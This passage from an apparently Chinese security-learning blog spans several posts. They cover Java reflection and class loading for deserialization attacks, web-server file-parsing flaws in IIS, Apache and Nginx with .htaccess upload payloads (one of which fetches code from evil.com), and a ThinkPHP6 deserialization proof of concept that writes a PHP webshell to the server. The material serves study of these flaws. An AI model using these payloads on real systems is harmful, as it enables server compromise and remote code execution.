class="line">        <span class="comment">//调用反射里面的方法</span></span><br><span class="line">        <span class="comment">// Method[] personMethods = c.getMethods();</span></span><br><span class="line">        <span class="comment">// for(Method f:personMethods)&#123;</span></span><br><span class="line">        <span class="comment">//     System.out.println(f);</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        Method actionmethod = c.getDeclaredMethod(<span class="string">&quot;action&quot;</span>, String.class);</span><br><span class="line">        actionmethod.setAccessible(<span class="keyword">true</span>);<span class="comment">//修改权限</span></span><br><span class="line">        actionmethod.invoke(p,<span class="string">&quot;sssss&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>详细介绍</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yepei/p/5649276.html#:~:text=Class%20%E7%B1%BB%E6%98%AF%E5%9C%A8Java%E8%AF%AD%E8%A8%80%E4%B8%AD%E5%AE%9A%E4%B9%89%E4%B8%80%E4%B8%AA%E7%89%B9%E5%AE%9A%E7%B1%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E3%80%82%20%E4%B8%80%E4%B8%AA%E7%B1%BB%E7%9A%84%E5%AE%9A%E4%B9%89%E5%8C%85%E5%90%AB%E6%88%90%E5%91%98%E5%8F%98%E9%87%8F%EF%BC%8C%E6%88%90%E5%91%98%E6%96%B9%E6%B3%95%EF%BC%8C%E8%BF%98%E6%9C%89%E8%BF%99%E4%B8%AA%E7%B1%BB%E5%AE%9E%E7%8E%B0%E7%9A%84%E6%8E%A5%E5%8F%A3%EF%BC%8C%E4%BB%A5%E5%8F%8A%E8%BF%99%E4%B8%AA%E7%B1%BB%E7%9A%84%E7%88%B6%E7%B1%BB%E3%80%82%20Class%E7%B1%BB%E7%9A%84%E5%AF%B9%E8%B1%A1%E7%94%A8%E4%BA%8E%E8%A1%A8%E7%A4%BA%E5%BD%93%E5%89%8D%E8%BF%90%E8%A1%8C%E7%9A%84%20Java,%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E4%B8%AD%E7%9A%84%E7%B1%BB%E5%92%8C%E6%8E%A5%E5%8F%A3%E3%80%82%20%E6%AF%94%E5%A6%82%EF%BC%9A%E6%AF%8F%E4%B8%AA%E6%95%B0%E7%BB%84%E5%9D%87%E5%B1%9E%E4%BA%8E%E4%B8%80%E4%B8%AA%20Class%20%E7%B1%BB%E5%AF%B9%E8%B1%A1%EF%BC%8C%E6%89%80%E6%9C%89%E5%85%B7%E6%9C%89%E7%9B%B8%E5%90%8C%E5%85%83%E7%B4%A0%E7%B1%BB%E5%9E%8B%E5%92%8C%E7%BB%B4%E6%95%B0%E7%9A%84%E6%95%B0%E7%BB%84%E5%85%B1%E4%BA%AB%E4%B8%80%E4%B8%AAClass%20%E5%AF%B9%E8%B1%A1%E3%80%82">Class类</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/86293659">Java 反射机制</a></p>
<h2 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h2><h4 id="可用形式"><a href="#可用形式" class="headerlink" title="可用形式"></a>可用形式</h4><p>1、入口类的readObject直接调用危险函数</p>
<p>2、入口类参数中包含可控类，该可控类有危险方法，readObject时调用</p>
<p>过程：入口A（hashmap）接收参数O（urldns链子）</p>
<p>​            要利用的类 (URL)</p>
<p>​            目标调用B.f（f为hashcode）</p>
<p>​            当A.readObject-&gt;O.f-(由于传入的是URL)&gt;B.f</p>
<p>​            从而调用“危险”函数（hashcode）</p>
<p>3、入口参数中包含可控类，该类有调用其他危险方法的类，readObject时调用</p>
<p>​    <strong>有时在反序列化漏洞中的应用</strong></p>
<p>​            定制需要的对象</p>
<p>​            通过invoke调用除了同名函数以外的函数</p>
<p>​            通过Class类创建对象，引用不能序列化的类</p>
<p>动态代理不管传递的参数是什么总会调用invoke类</p>
<p>java命令执行</p>
<p> Runtime.getRuntime().exec(“calc”)</p>
<h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><p>在不修改原有类的情况下增加功能。</p>
<p>在反序列化漏洞的作用：</p>
<p>readObject-&gt;反序列化自动执行</p>
<p>invoke-&gt;有函数调用</p>
<p>主要代码</p>
<p>test.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"><span class="comment">//import java.io.ObjectInputStream.GetField;</span></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        IUser user= <span class="keyword">new</span> UserImpl();</span><br><span class="line">        <span class="comment">// user.show();</span></span><br><span class="line">        <span class="comment">//静态代理（如果被代理者添加方法，proxy也需要添加，很麻烦！）</span></span><br><span class="line">        <span class="comment">// Userproxy proxy = new Userproxy(user);</span></span><br><span class="line">        <span class="comment">// proxy.show();</span></span><br><span class="line">        <span class="comment">//动态代理</span></span><br><span class="line">        <span class="comment">//要代理的接口，要做的事，calssLader</span></span><br><span class="line">        InvocationHandler useinvocationhandler = <span class="keyword">new</span> Userinvocationhandler(user);</span><br><span class="line">        IUser proxy = (IUser)Proxy.newProxyInstance(user.getClass().getClassLoader(),user.getClass().getInterfaces(),useinvocationhandler);</span><br><span class="line">        proxy.a();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Userinvocationhandler.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Userinvocationhandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span></span>&#123;</span><br><span class="line">    IUser user;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Userinvocationhandler</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Userinvocationhandler</span><span class="params">(IUser user)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.user = user;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable</span>&#123;</span><br><span class="line">        method.invoke(user,args);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>意义：少修改代码，适配性强。</p>
<h2 id="类的加载"><a href="#类的加载" class="headerlink" title="类的加载"></a>类的加载</h2><p>静态代码块和非静态代码块</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">静态</span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line">非静态</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>相同点：都是JVM加载类时且在构造函数执行之前执行，在类中都可以定义多个，一般在代码块中对一些static变量进行赋值。</p>
<p>不同点：静态代码块在非静态代码块之前执行（静态代码块 &gt; 非静态代码块）。静态代码块只在第一次new时执行一次，之后不再执行。而非静态代码块每new一次就执行一次</p>
<p><strong>加载与反序列化</strong></p>
<p>类加载的时候会执行代码</p>
<p>初始化：静态代码块</p>
<p>实例化：构造代码块，无参构造函数</p>
<p><strong>动态类加载方法</strong></p>
<p>Class.forname</p>
<p>初始化/不初始化</p>
<p>ClassLoader.loadClass不进行初始化</p>
<p>底层原理，实现加载任意类</p>
<p>ClassLoader-&gt;SecureClassLoader-&gt;URLClassLoader-&gt;AppClassLoader</p>
<p>loadClass-&gt;findClass(重写的方法)-&gt;defineClass(从字节码加载类)</p>
<p>URLClassLoader任意类加载：file/http/jar</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URLClassLoader urlClassloader = <span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[]&#123;<span class="keyword">new</span> URL(<span class="string">&quot;file:///类的路径&quot;</span>)&#125;);</span><br><span class="line">        Class&lt;?&gt; c = urlClassloader.loadClass(<span class="string">&quot;类名&quot;</span>);</span><br><span class="line">        c.newInstance();</span><br></pre></td></tr></table></figure>

<p>defineClass同态加载字节码从而加载任意类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ClassLoader cl = ClassLoader.getSystemClassLoader();</span><br><span class="line">        Method m = ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>,String.class, <span class="keyword">byte</span>[].class, <span class="keyword">int</span>.class, <span class="keyword">int</span>.class);</span><br><span class="line">        m.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\text\\class\\text.class&quot;</span>));</span><br><span class="line">        Class c = (Class)m.invoke(cl,<span class="string">&quot;text&quot;</span>,code,<span class="number">0</span>,code.length);</span><br><span class="line">        c.newInstance();</span><br></pre></td></tr></table></figure>

<p>java9及以上的版本会出现报错，可在vm option中添加</p>
<blockquote>
<p>错误：module java.base does not “opens java.lang” to unnamed module</p>
<p>–add-opens java.base/java.lang=ALL-UNNAMED</p>
</blockquote>
<p>unsafe.defineClass字节码加载public类不能直接生成（需要反射），Spring里面可以直接生成</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这个实例仅适用于Java 8以前的版本。Java 11开始Unsafe类已经把defineClass方法移除了。</span></span><br><span class="line">		ClassLoader cl = ClassLoader.getSystemClassLoader();</span><br><span class="line">		 <span class="keyword">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\text\\class\\text.class&quot;</span>));</span><br><span class="line">        Class c = Unsafe.class;</span><br><span class="line">        Field unsafeField = c.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        unsafeField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Unsafe unsafe = (Unsafe) unsafeField.get(<span class="keyword">null</span>);</span><br><span class="line">        Class c2 = unsafe.defineClass(<span class="string">&quot;text&quot;</span>,code,<span class="number">0</span>,code.length,cl,<span class="keyword">null</span>);</span><br><span class="line">        c2.newInstance();</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u010398771/article/details/85319991">java中Unsafe使用讲解</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/05/09/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/">中间件文件解析漏洞</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-05-09</time><div class="content"><p>当一次搬运工</p>
<h1 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h1><h2 id="IIS-6-0"><a href="#IIS-6-0" class="headerlink" title="IIS 6.0"></a>IIS 6.0</h2><blockquote>
<p>后缀解析 /xx.asp;.jpg 服务器默认不解析 ; 号及其后面的内容，相当于截断<br> 目录解析 /xx.asp/xx.jpg(xx.asp目录下任意解析)<br> 默认解析 xx.asa xx.cer xx.cdx<br> PROPFIND 栈溢出漏洞<br> RCE CVE-2017-7269</p>
</blockquote>
<h2 id="IIS-7-0-7-5-Nginx-lt-0-8-37"><a href="#IIS-7-0-7-5-Nginx-lt-0-8-37" class="headerlink" title="IIS 7.0-7.5 / Nginx &lt;= 0.8.37"></a>IIS 7.0-7.5 / Nginx &lt;= 0.8.37</h2><p>在Fast-CGI开启状态下，在文件路径后加上 /xx.php ，即 xx.jpg/xx.php 会被解析为php文件。</p>
<h2 id="PUT漏洞"><a href="#PUT漏洞" class="headerlink" title="PUT漏洞"></a>PUT漏洞</h2><p>开启WebDAV<br>拥有来宾用户，且来宾用户拥有上传权限<br>可任意文件上传</p>
<h2 id="Windows特性"><a href="#Windows特性" class="headerlink" title="Windows特性"></a>Windows特性</h2><p>Windows不允许空格和点以及一些特殊字符作为结尾，创建这样的文件会自动重命名，所以可以使用 xx.php[空格] ， xx.php.， xx.php/， xx.php::$DATA 上传脚本文件。</p>
<h2 id="文件名猜解"><a href="#文件名猜解" class="headerlink" title="文件名猜解"></a>文件名猜解</h2><p>在支持NTFS 8.3文件格式时，可利用短文件名猜解目录文件。其中短文件名特征如下：</p>
<p>文件名为原文件名前6位字符加上 ~1 ，其中数字部分是递增的，如果存在前缀相同的文件，则后面的数字进行递增。<br>后缀名不超过3位，超过部分会被截断<br>所有小写字母均转换成大写的字母<br>文件名后缀长度大于等于4或者总长度大于等于9时才会生成短文件名，如果包含空格或者其他部分特殊字符，则无视长度条件</p>
<p>IIS 8.0之前的版本支持短文件名猜测的HTTP方法主要包括：DEBUG、OPTIONS、GET、POST、HEAD、TRACE六种，需要安装ASP.NET。而IIS 8.0之后的版本只能通过OPTIONS和TRACE方法猜测成功，但是没有ASP.NET的限制。</p>
<p>这种方法的局限性在于：</p>
<p>文件夹名前6位字符带点”.”，扫描程序会认为是文件而不是文件夹，最终出现误报<br>不支持中文文件名</p>
<p>这种方法可以通过命令 fsutil behavior set disable8dot3 1 关闭NTFS 8.3文件格式的支持来修复。</p>
<h1 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h1><h2 id="后缀解析"><a href="#后缀解析" class="headerlink" title="后缀解析"></a>后缀解析</h2><p>test.php.x1.x2.x3 （ x1,x2,x3 为没有在 mime.types 文件中定义的文件类型）。Apache 将从右往左开始判断后缀， 若x3为非可识别后缀，则判断x2，直到找到可识别后缀为止，然后对可识别后缀进行解析</p>
<h2 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h2><p>当 AllowOverride 被启用时，上传启用解析规则的.htaccess</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file .htaccess</span><br><span class="line"><span class="comment">#&lt;?php phpinfo();</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Options ExecCGI</span><br><span class="line">AddHandler cgi-script .jpg</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Options +ExecCGI</span><br><span class="line">AddHandler fcgid-script .gif</span><br><span class="line">FcgidWrapper <span class="string">&quot;/bin/bash&quot;</span> .gif</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_flag allow_url_include <span class="number">1</span></span><br><span class="line">php_value auto_append_file data:<span class="comment">//text/plain;base64,PD9waHAgcGhwaW5mbygpOw==</span></span><br><span class="line"><span class="comment">#php_value auto_append_file data://text/plain,%3C%3Fphp+phpinfo%28%29%3B</span></span><br><span class="line"><span class="comment">#php_value auto_append_file https://evil.com/evil-code.txt</span></span><br></pre></td></tr></table></figure>

<h2 id="CVE-2017-15715"><a href="#CVE-2017-15715" class="headerlink" title="CVE-2017-15715"></a>CVE-2017-15715</h2><p>%0A 绕过上传黑名单。<br><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1676145">Apache HTTPD换行解析漏洞</a></p>
<h2 id="lighttpd"><a href="#lighttpd" class="headerlink" title="lighttpd"></a>lighttpd</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx.jpg/xx.php</span><br></pre></td></tr></table></figure>

<h1 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h1><h2 id="Fast-CGI关闭"><a href="#Fast-CGI关闭" class="headerlink" title="Fast-CGI关闭"></a>Fast-CGI关闭</h2><p>在Fast-CGI关闭的情况下， Nginx 仍然存在解析漏洞： 在文件路径(xx.jpg)后面加上 %00.php ， 即 xx.jpg%00.php 会被当做 php 文件来解析<br>影响以下版本</p>
<blockquote>
<p>Nginx 0.5.*<br>Nginx 0.6.*<br>Nginx 0.7 &lt;= 0.7.65<br>Nginx 0.8 &lt;= 0.8.37</p>
</blockquote>
<h2 id="Fast-CGI开启"><a href="#Fast-CGI开启" class="headerlink" title="Fast-CGI开启"></a>Fast-CGI开启</h2><p>在Fast-CGI开启状态下，在文件路径后加上 /xx.php ，则 xx.jpg/xx.php 会被解析为php文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php的配置文件 php.ini 文件中开启了 cgi.fix_pathinfo</span><br><span class="line"></span><br><span class="line">/etc/php5/fpm/pool.d/www.conf中不正确的配置security.limit_extensions，导致允许将其他格式文件作为php解析执行</span><br></pre></td></tr></table></figure>

<h2 id="CVE-2013-4547"><a href="#CVE-2013-4547" class="headerlink" title="CVE-2013-4547"></a>CVE-2013-4547</h2><p>影响nginx版本：nginx 0.8.41 ~ 1.5.6</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a.jpg\x20\x00.php</span><br></pre></td></tr></table></figure>
<h2 id="配置错误"><a href="#配置错误" class="headerlink" title="配置错误"></a>配置错误</h2><h3 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h3><p>如果配置中存在类似 location /foo { alias /bar/; } 的配置时，/foo../ 会被解析为 /bar/../ 从而导致目录穿越的发生。</p>
<h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><p>配置中 autoindex on 开启时，Nginx中存在目录遍历漏洞。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yokan/p/12444476.html">文件解析漏洞总结</a><br><a target="_blank" rel="noopener" href="http://www.yongsheng.site/2022/01/14/%E4%B8%AD%E9%97%B4%E4%BB%B6/">大佬博客</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/05/09/thinkphp6%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0&amp;%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&amp;%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%20%E5%88%86%E6%9E%90/">thinkphp6框架学习&amp;反序列化&amp;任意写文件 分析</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-05-09</time><div class="content"><h2 id="开发手册"><a href="#开发手册" class="headerlink" title="开发手册"></a>开发手册</h2><p><a target="_blank" rel="noopener" href="https://www.kancloud.cn/manual/thinkphp6_0">think6框架手册</a><br>若想搞开发看大佬博客<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38626043?type=blog">PHP 开发 ThinkPHP6 框架学习 一</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38626043/article/details/121317358?spm=1001.2014.3001.5502">PHP开发 ThinkPHP6 框架学习 二</a></p>
<h2 id="tp6下载及配置"><a href="#tp6下载及配置" class="headerlink" title="tp6下载及配置"></a>tp6下载及配置</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Quest_sec/article/details/105340807">用phpstudy部署thinkphp6 / 使用教程</a><br>利用compose下载<br><a target="_blank" rel="noopener" href="https://packagist.org/packages/topthink/think">下载指令网址</a><br>配置<br><img src="https://img-blog.csdnimg.cn/ea7a3c8d2878438fa782ded800711efd.png"><br><img src="https://img-blog.csdnimg.cn/cb1764f2dd864250a634c85d6e7ff280.png"><br>使用composer安装tp6 php版本在7.1以上</p>
<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>写入demo:<br>D:\phpstudy_pro\WWW\thinkphp6\app\controller\Index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">BaseController</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"><span class="variable">$unser</span> = <span class="string">&quot;&quot;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">		unserialize(<span class="variable">$unser</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Cached</span>\<span class="title">Storage</span>&#123;</span><br><span class="line">	<span class="title">use</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Filesystem</span>\<span class="title">AbstractAdapter</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractCache</span></span>&#123;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$autosave</span> = <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Adapter</span> <span class="keyword">extends</span> <span class="title">AbstractCache</span></span>&#123;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$adapter</span>;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$file</span>;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$expire</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;file=<span class="string">&quot;cyxhack.php&quot;</span>;  <span class="comment">//文件名称</span></span><br><span class="line">			<span class="keyword">$this</span>-&gt;complete=<span class="string">&quot;&lt;?php eval(\$_POST[a]);?&gt;&quot;</span>;  <span class="comment">//内容</span></span><br><span class="line">			<span class="keyword">$this</span>-&gt;adapter=<span class="keyword">new</span> \League\Flysystem\Adapter\Local();  <span class="comment">//has()方法</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Adapter</span>&#123;</span><br><span class="line">	<span class="title">class</span> <span class="title">Local</span> <span class="title">extends</span> <span class="title">AbstractAdapter</span>&#123;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="title">abstract</span> <span class="title">class</span> <span class="title">AbstractAdapter</span>&#123;</span><br><span class="line">		<span class="title">protected</span> $<span class="title">pathPrefix</span> = &quot;./&quot;;  <span class="comment">//这里进行目录的更改</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">	$<span class="title">a</span> = <span class="title">new</span> \<span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Cached</span>\<span class="title">Storage</span>\<span class="title">Adapter</span>();</span><br><span class="line">	<span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>写入木马<br><img src="https://img-blog.csdnimg.cn/b79986d17dd34bfe995e0a8cd48bc033.png"></p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>全局搜索__destruct()<br><img src="https://img-blog.csdnimg.cn/a8defd503b8c4430ac7b703f2206b9f7.png"><br>在src/Storage/AbstractCache.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractCache</span> <span class="keyword">implements</span> <span class="title">CacheInterface</span></span></span><br></pre></td></tr></table></figure>
<p>如果autosave为false则执行save()函数<br><img src="https://img-blog.csdnimg.cn/29dc9df67c334f218d0ba316c1083cc7.png"><br>查找save()函数<br>发现在<br><img src="https://img-blog.csdnimg.cn/0e75786ecc6f49f1bcfa51ad59d21cd9.png"><br>跟进getForStorage()函数<br><img src="https://img-blog.csdnimg.cn/041dc6c3f39d498fb1e54492b13d518d.png"><br>发现参数cache complete 和方法cleanContents()在抽象类中, expire在当前类中<br>跟进cleanContents()发现没什么用，那么在save()函数中$contents参数我们可控<br>接下来进行一个has()方法的判断，我们肯定是想进行write()方法，那么has()就要返回一个false<br>搜索has()方法，在src/Adapter/Local.php<br><img src="https://img-blog.csdnimg.cn/1b3fa5321d4c4e4b8e1da71a1eff73b1.png"><br>进到applyPathPrefix()<br><img src="https://img-blog.csdnimg.cn/8ed457c9afb34482bf633b43f8dd94dc.png"><br>转到getPathPrefix()函数<br><img src="https://img-blog.csdnimg.cn/74157d07600144c187537a55e0efd11c.png"><br>这里的getPathPrefix()函数可控，让pathPrefix为 ./ 再配合ltrim可以控制任意写入文件的目录地址</p>
<p>ltrim意思是去除 \ 最终返回到has()的 file_exists($ location) 因为这里的$location是我们写入的文件名: ./cyxhack.php不存在，所以返回false<br>然后向上返回到write()函数，写入一句话</p>
<p><a target="_blank" rel="noopener" href="http://www.yongsheng.site/2021/10/16/ThinkPHP%20v6.0.9%20save%28%29%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6/">大佬博客</a></p>
